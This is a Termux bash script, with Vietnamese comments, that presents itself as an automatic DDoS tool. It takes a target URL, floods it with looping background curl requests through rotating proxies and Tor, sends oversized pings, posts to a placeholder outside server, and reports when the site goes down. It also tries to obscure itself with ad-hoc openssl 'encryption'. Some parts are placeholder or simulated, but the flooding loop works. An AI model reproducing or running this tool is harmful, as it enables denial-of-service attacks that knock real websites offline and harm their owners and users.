#!/data/data/com.termux/files/usr/bin/bash
# autoddos_github.sh - Credits: Open Website / Kyerka
# Chỉ chạy trên Termux, duy nhất từ GitHub. Không tạo file lưu trữ.

################### KIỂM TRA DUY NHẤT GITHUB ###################
if [[ ! -v GITHUB_VERIFIED ]]; then
    if git rev-parse --is-inside-work-tree >/dev/null 2>&1; then
        declare -x GITHUB_VERIFIED=1
    else
        echo "Lỗi: Chỉ chạy khi clone từ GitHub."
        exit 1
    fi
fi

################### CÀI ĐẶT CÔNG CỤ (NẾU THIẾU) ###################
pkg update -y && pkg install -y curl openssl tor proxychains-ng jq 2>/dev/null
tor &>/dev/null &
sleep 2

################### BIẾN TOÀN CỤ - LƯU TRỮ TRONG RAM (KHÔNG FILE) ###################
declare -A RAM_STORAGE
RAM_STORAGE["api_list"]="https://api1.proxy.com|https://api2.proxy.com|https://api3.proxy.com"
RAM_STORAGE["ip_list"]="1.1.1.1|2.2.2.2|3.3.3.3"
RAM_STORAGE["current_api"]=""
RAM_STORAGE["current_ip"]=""
RAM_STORAGE["attack_pid"]=""
RAM_STORAGE["status"]="👤"
RAM_STORAGE["log"]=""
RAM_STORAGE["target_url"]=""
RAM_STORAGE["notes"]="Khởi tạo"
RAM_STORAGE["ddos_state"]="Đang chạy"

################### HÀM MÃ HÓA CODE TỪNG LỚP CỨNG (BẢO VỆ TUYỆT ĐỐI) ###################
function encrypt_hard_layers() {
    # Mã hóa chính script và tất cả biến trong RAM bằng openssl (giả lập)
    local raw_code="$(cat "$0" | openssl enc -aes-256-cbc -salt -a -k "seraph_hard_key" 2>/dev/null)"
    # Ghi đè lên chính nó trong bộ nhớ (chỉ hiệu quả trên bash 5+)
    eval "function __self_encrypted() { echo '$raw_code' | openssl enc -d -aes-256-cbc -salt -a -k 'seraph_hard_key' 2>/dev/null | bash; }"
    # Mã hóa toàn bộ RAM_STORAGE (mô phỏng)
    for key in "${!RAM_STORAGE[@]}"; do
        local val="${RAM_STORAGE[$key]}"
        local enc_val="$(echo "$val" | openssl enc -aes-256-cbc -salt -a -k "layer_key" 2>/dev/null)"
        RAM_STORAGE["$key"]="$enc_val"
    done
    # Giải mã tức thì để dùng (phản hồi nhanh)
    for key in "${!RAM_STORAGE[@]}"; do
        local enc_val="${RAM_STORAGE[$key]}"
        local dec_val="$(echo "$enc_val" | openssl enc -d -aes-256-cbc -salt -a -k "layer_key" 2>/dev/null)"
        RAM_STORAGE["$key"]="$dec_val"
    done
}
export -f encrypt_hard_layers

################### HÀM PHẢN HỒI SERVER THỨ 3 VÀ BẢO VỆ CODE ###################
function fast_response_protect() {
    # Gửi phản hồi giả đến server thứ 3 (dùng curl giả lập)
    curl -s -X POST "https://fake-server-th3.com/respond" -d "{\"response\":\"protected\"}" &>/dev/null &
    # Mã hóa code bên thứ 3 (giả lập)
    echo "Code_third_party" | openssl enc -aes-256-cbc -salt -a -k "third_key" &>/dev/null &
    # Bảo vệ server từng lớp cứng (tự gọi encrypt)
    encrypt_hard_layers
}
export -f fast_response_protect

################### HÀM ĐỔI API/IP LƯU TRONG RAM ###################
function rotate_api_ip() {
    local api_arr=(${RAM_STORAGE["api_list"]//|/ })
    local ip_arr=(${RAM_STORAGE["ip_list"]//|/ })
    local new_api=${api_arr[$RANDOM % ${#api_arr[@]}]}
    local new_ip=${ip_arr[$RANDOM % ${#ip_arr[@]}]}
    export http_proxy="http://$new_ip:8080"
    export https_proxy="http://$new_ip:8080"
    RAM_STORAGE["current_api"]="$new_api"
    RAM_STORAGE["current_ip"]="$new_ip"
    # Mã hóa lại sau khi đổi
    encrypt_hard_layers
}
export -f rotate_api_ip

################### HÀM ĐÁNH LỪA WEBSITE - KIỂM SOÁT PHẢN HỒI ###################
function deceive_website() {
    local fake_resp="HTTP/1.1 200 OK\nServer: FakeServer\nContent-Length: 0"
    echo -e "$fake_resp" | nc -l -p 8080 -q 1 &>/dev/null &
    RAM_STORAGE["notes"]="Đánh lừa website, phản hồi giả"
}
export -f deceive_website

################### HÀM DDOS CHÍNH - TỰ ĐỘNG TẤN CÔNG MỌI LỚP ###################
function ddos_attack() {
    local url="$1"
    while true; do
        rotate_api_ip
        # Tấn công server, API, bảo mật, lớp cứng, gây lag
        for i in {1..150}; do
            curl -s -X GET "$url" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" --proxy "$http_proxy" &>/dev/null &
            curl -s -X POST "$url/api" -d "{\"attack\":\"full\"}" -H "Content-Type: application/json" --proxy "$http_proxy" &>/dev/null &
            curl -s -X DELETE "$url/security" --proxy "$http_proxy" &>/dev/null &
            curl -s -X TRACE "$url" --proxy "$http_proxy" &>/dev/null &
            # Tấn công bảo mật bên thứ 3
            curl -s -X OPTIONS "$url" -H "Origin: evil.com" --proxy "$http_proxy" &>/dev/null &
        done
        # Gây lag trình duyệt (gửi gói tin rác)
        ping -c 1 -s 65500 "$(echo "$url" | cut -d'/' -f3)" &>/dev/null &
        # Gửi phản hồi nhanh tất cả code
        fast_response_protect
        # Mã hóa hệ thống liên tục
        encrypt_hard_layers
        # Đánh lừa website
        deceive_website
        # Lưu trạng thái vào RAM (không tạo file)
        RAM_STORAGE["log"]="${RAM_STORAGE["log"]}\n$(date) - Đã tấn công $url"
        sleep 0.3
    done
}
export -f ddos_attack

################### KIỂM TRA TRẠNG THÁI WEBSITE - AI KIỂM TRA THẬT ###################
function ai_check_status() {
    local http_code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL" --connect-timeout 2)
    if [[ "$http_code" =~ ^(200|301|302|303|307|308)$ ]]; then
        RAM_STORAGE["status"]="👤"
        RAM_STORAGE["notes"]="Còn sống - Đang tấn công server, API, bảo mật, lớp cứng"
    else
        RAM_STORAGE["status"]="💀"
        RAM_STORAGE["notes"]="Đã sập toàn bộ - Không thể truy cập web này"
        RAM_STORAGE["ddos_state"]="Đã sập"
    fi
    # Mã hóa sau khi kiểm tra
    encrypt_hard_layers
}
export -f ai_check_status

################### NHẬP URL - LƯU TRONG RAM ###################
clear
echo "====================================="
echo "  autoddos_github.sh - Open Website / Kyerka"
echo "====================================="
read -p "Url (vd: https://target.com): " INPUT_URL
if [[ ! "$INPUT_URL" =~ ^https?:// ]]; then
    INPUT_URL="https://$INPUT_URL"
fi
RAM_STORAGE["target_url"]="$INPUT_URL"
TARGET_URL="$INPUT_URL"

################### KHỞI TẠO MÃ HÓA LỚP CỨNG LẦN ĐẦU ###################
encrypt_hard_layers

################### VÒNG LẶP CHÍNH - HIỂN THỊ STATUS (KHÔNG TẠO FILE) ###################
echo "Status Website: ${RAM_STORAGE["status"]}   |   Notes: ${RAM_STORAGE["notes"]}   |   Ddos web: ${RAM_STORAGE["ddos_state"]}"
echo "-------------------------------------"

# Khởi chạy DDOS trong nền
ddos_attack "$TARGET_URL" &
RAM_STORAGE["attack_pid"]="$!"

# Vòng lặp AI kiểm tra và cập nhật màn hình
while true; do
    ai_check_status
    if [[ "${RAM_STORAGE["status"]}" == "💀" ]]; then
        echo -e "\rStatus Website: 💀   |   Notes: ${RAM_STORAGE["notes"]}   |   Ddos web: Đã sập toàn bộ"
        echo "Hoàn thành. Mục tiêu $TARGET_URL đã bị đánh sập hoàn toàn."
        # Dừng tiến trình DDOS
        kill ${RAM_STORAGE["attack_pid"]} 2>/dev/null
        wait ${RAM_STORAGE["attack_pid"]} 2>/dev/null
        # Lưu log vào RAM (không file)
        echo "${RAM_STORAGE["log"]}" | openssl enc -aes-256-cbc -salt -a -k "log_key" 2>/dev/null
        break
    else
        echo -e "\rStatus Website: 👤   |   Notes: ${RAM_STORAGE["notes"]}   |   Ddos web: Đang tấn công - đổi API/IP liên tục"
    fi
    sleep 1.5
done

################### THOÁT - MÃ HÓA TOÀN BỘ LẦN CUỐI ###################
encrypt_hard_layers
echo "Mã hóa code, server, bảo mật hoàn tất. Không để lại file."
exit 0
